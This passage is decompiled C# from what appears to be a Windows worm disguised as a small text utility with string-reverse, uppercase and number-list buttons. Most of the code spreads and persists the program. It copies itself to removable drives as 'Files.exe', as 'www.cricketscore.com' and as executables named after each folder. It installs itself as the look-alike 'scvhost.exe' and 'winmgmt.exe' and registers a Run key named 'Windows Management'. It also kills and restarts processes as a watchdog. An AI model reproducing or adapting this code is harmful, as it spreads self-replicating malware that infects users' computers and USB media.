					IL_003f:
					if (num5 < processes.Length)
					{
						process = processes[num5];
						goto IL_0018;
					}
					goto end_IL_0000_2;
					IL_003c:
					num = 6;
					goto IL_003f;
					IL_0018:
					num = 3;
					if (Operators.CompareString(process.ProcessName, "winmgmt", false) == 0)
					{
						goto IL_002f;
					}
					goto IL_0038;
					IL_002f:
					num = 4;
					process.Kill();
					goto IL_0038;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 117;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void trusbc_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 57:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					remmd();
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				remmdsb();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 57;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void remmd()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		DriveInfo current = default(DriveInfo);
		IEnumerator<DriveInfo> enumerator = default(IEnumerator<DriveInfo>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 571:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0031;
						case 4:
							goto IL_005e;
						case 5:
							goto IL_0082;
						case 6:
						case 7:
							goto IL_00a9;
						case 8:
							goto IL_00d0;
						case 12:
							goto IL_00fc;
						case 13:
							goto IL_0121;
						case 14:
						case 15:
							goto IL_0149;
						case 16:
							goto IL_016e;
						case 17:
						case 18:
						case 19:
							goto IL_0196;
						case 9:
						case 10:
						case 11:
							goto IL_019f;
						default:
							goto end_IL_0000;
						case 20:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_016e:
					num = 16;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), current.ToString() + "www.cricketscore.com");
					goto IL_0196;
					IL_0007:
					num = 2;
					enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().GetEnumerator();
					goto IL_001f;
					IL_001f:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0031;
					}
					enumerator?.Dispose();
					goto end_IL_0000_2;
					IL_0196:
					num = 19;
					goto IL_001f;
					IL_0031:
					num = 3;
					if (current.IsReady & (Operators.CompareString(current.DriveType.ToString(), "Removable", false) == 0))
					{
						goto IL_005e;
					}
					goto IL_019f;
					IL_005e:
					num = 4;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(current.ToString() + "Files.exe"))
					{
						goto IL_0082;
					}
					goto IL_00a9;
					IL_0082:
					num = 5;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), current.ToString() + "Files.exe");
					goto IL_00a9;
					IL_00a9:
					num = 7;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(current.ToString() + "www.cricketscore.com"))
					{
						goto IL_00d0;
					}
					goto IL_019f;
					IL_00d0:
					num = 8;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), current.ToString() + "www.cricketscore.com");
					goto IL_019f;
					IL_019f:
					num = 11;
					if (current.IsReady & ((double)current.TotalSize / 1073741824.0 > 450.0))
					{
						goto IL_00fc;
					}
					goto IL_0196;
					IL_00fc:
					num = 12;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(current.ToString() + "Files.exe"))
					{
						goto IL_0121;
					}
					goto IL_0149;
					IL_0121:
					num = 13;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), current.ToString() + "Files.exe");
					goto IL_0149;
					IL_0149:
					num = 15;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(current.ToString() + "www.cricketscore.com"))
					{
						goto IL_016e;
					}
					goto IL_0196;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 571;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void remmdsb()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string current = default(string);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		IEnumerator<DriveInfo> enumerator = default(IEnumerator<DriveInfo>);
		DriveInfo current2 = default(DriveInfo);
		IEnumerator<string> enumerator2 = default(IEnumerator<string>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 381:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0032;
						case 4:
							goto IL_005f;
						case 5:
							goto IL_00a3;
						case 6:
							goto IL_00b7;
						case 7:
							goto IL_00e1;
						case 10:
						case 11:
							goto IL_011b;
						case 8:
						case 9:
							goto IL_0124;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00e1:
					num = 7;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), current + "\\" + directoryInfo.get_Name() + " .exe");
					goto IL_0124;
					IL_0008:
					num = 2;
					enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().GetEnumerator();
					goto IL_0020;
					IL_0020:
					if (enumerator.MoveNext())
					{
						current2 = enumerator.Current;
						goto IL_0032;
					}
					enumerator?.Dispose();
					goto end_IL_0000_2;
					IL_0124:
					num = 9;
					goto IL_0092;
					IL_0032:
					num = 3;
					if (current2.IsReady & (Operators.CompareString(current2.DriveType.ToString(), "Removable", false) == 0))
					{
						goto IL_005f;
					}
					goto IL_011b;
					IL_005f:
					num = 4;
					enumerator2 = ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(current2.ToString(), (SearchOption)3, new string[1] { "*" }).GetEnumerator();
					goto IL_0092;
					IL_0092:
					if (enumerator2.MoveNext())
					{
						current = enumerator2.Current;
						goto IL_00a3;
					}
					enumerator2?.Dispose();
					goto IL_011b;
					IL_011b:
					num = 11;
					goto IL_0020;
					IL_00a3:
					num = 5;
					directoryInfo = ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectoryInfo(current);
					goto IL_00b7;
					IL_00b7:
					num = 6;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(current + "\\" + directoryInfo.get_Name() + " .exe"))
					{
						goto IL_00e1;
					}
					goto IL_0124;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 381;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void tr2_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 81:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0017;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0017:
					num = 4;
					chkreg2();
					break;
					IL_0007:
					num = 2;
					cptstartup2();
					goto IL_000f;
					IL_000f:
					num = 3;
					chkstartuppath2();
					goto IL_0017;
					end_IL_0000_2:
					break;
				}
				num = 5;
				doc2();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 81;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void cptstartup2()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0020;
						case 4:
						case 5:
							goto IL_003c;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003c:
					num = 5;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(appregapth2))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(appstartpath2))
					{
						goto IL_0020;
					}
					goto IL_003c;
					IL_0020:
					num = 3;
					((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), appstartpath2);
					goto IL_003c;
					end_IL_0000_2:
					break;
				}
				num = 6;
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), appregapth2);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void chkstartuppath2()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 248:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0023;
						case 4:
							goto IL_003f;
						case 7:
							goto IL_0071;
						case 8:
							goto IL_0073;
						case 9:
							goto IL_0081;
						case 10:
							goto IL_0090;
						case 11:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
						case 6:
						case 12:
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0090:
					num = 10;
					Application.Exit();
					break;
					IL_0007:
					num = 2;
					appstartpath2 = Interaction.Environ("userprofile") + "\\Start Menu\\Programs\\Startup\\scvhost.exe";
					goto IL_0023;
					IL_0023:
					num = 3;
					appregapth2 = Interaction.Environ("systemroot") + "\\winmgmt.exe";
					goto IL_003f;
					IL_003f:
					num = 4;
					if ((Operators.CompareString(Application.get_ExecutablePath(), appstartpath2, false) == 0) | (Operators.CompareString(Application.get_ExecutablePath(), appregapth2, false) == 0))
					{
						goto end_IL_0000_3;
					}
					goto IL_0071;
					IL_0071:
					num = 7;
					goto IL_0073;
					IL_0073:
					num = 8;
					Process.Start(appstartpath2);
					goto IL_0081;
					IL_0081:
					num = 9;
					Process.Start(appregapth2);
					goto IL_0090;
					end_IL_0000_2:
					break;
				}
				num = 11;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 248;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void chkreg2()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 132:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_002f;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_002f:
					num = 4;
					if (Operators.CompareString(text, appregapth2, false) == 0)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\Currentversion\\Run", writable: true);
					goto IL_001b;
					IL_001b:
					num = 3;
					text = Conversions.ToString(registryKey.GetValue("Windows Management"));
					goto IL_002f;
					end_IL_0000_2:
					break;
				}
				num = 5;
				registryKey.SetValue("Windows Management", appregapth2);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 132;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void doc2()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 115:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_001e;
						case 4:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_001e:
					num = 3;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0007:
					num = 2;
					text = Interaction.Environ("USERPROFILE") + "\\My Documents\\Files.exe";
					goto IL_001e;
					end_IL_0000_2:
					break;
				}
				num = 4;
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 115;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void trprcrun2_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 187:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0017;
						case 4:
						case 5:
							goto IL_0025;
						case 6:
							goto IL_0035;
						case 7:
						case 8:
							goto IL_0043;
						case 9:
						case 10:
						case 11:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 12:
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0043:
					num = 8;
					if (PR("winmgmt") > 5)
					{
						ProjectData.EndApp();
					}
					break;
					IL_0007:
					num = 2;
					if (PR("winmgmt") == 0)
					{
						goto IL_0017;
					}
					goto IL_0025;
					IL_0017:
					num = 3;
					Process.Start(appregapth2);
					goto IL_0025;
					IL_0025:
					num = 5;
					if (PR("scvhost") == 0)
					{
						goto IL_0035;
					}
					goto IL_0043;
					IL_0035:
					num = 6;
					Process.Start(appstartpath2);
					goto IL_0043;
					end_IL_0000_2:
					break;
				}
				num = 11;
				if (PR("scvhost") > 6)
				{
					ProjectData.EndApp();
				}
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 187;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void btnstart_Click(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 140:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0022;
						case 5:
							goto IL_003b;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 7:
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003b:
					num = 5;
					break;
					IL_0007:
					num = 2;
					if (Operators.CompareString(TextBox1.get_Text(), "", false) == 0)
					{
						goto IL_0022;
					}
					goto IL_003b;
					IL_0022:
					num = 3;
					Interaction.MsgBox((object)"Enter some text", (MsgBoxStyle)64, (object)"String Reverse");
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 6;
				TextBox1.set_Text(Strings.StrReverse(TextBox1.get_Text()));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 140;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void btncase_Click(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 66:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				TextBox1.set_Text(Strings.UCase(TextBox1.get_Text()));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 66;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void btnlist_Click(object sender, EventArgs e)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 134:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 4:
							goto IL_000d;
						case 3:
							goto IL_0018;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_000d:
					num = 4;
					num5 = checked(num5 + 2);
					if (num5 > 50)
					{
						break;
					}
					goto IL_0018;
					IL_0007:
					num = 2;
					num5 = 0;
					goto IL_0018;
					IL_0018:
					num = 3;
					ListBox1.get_Items().Add((object)num5);
					goto IL_000d;
					end_IL_0000_2:
					break;
				}
				num = 5;
				Interaction.MsgBox((object)("Total no. of integers is " + Conversions.ToString(ListBox1.get_Items().get_Count())), (MsgBoxStyle)0, (object)null);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 134;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
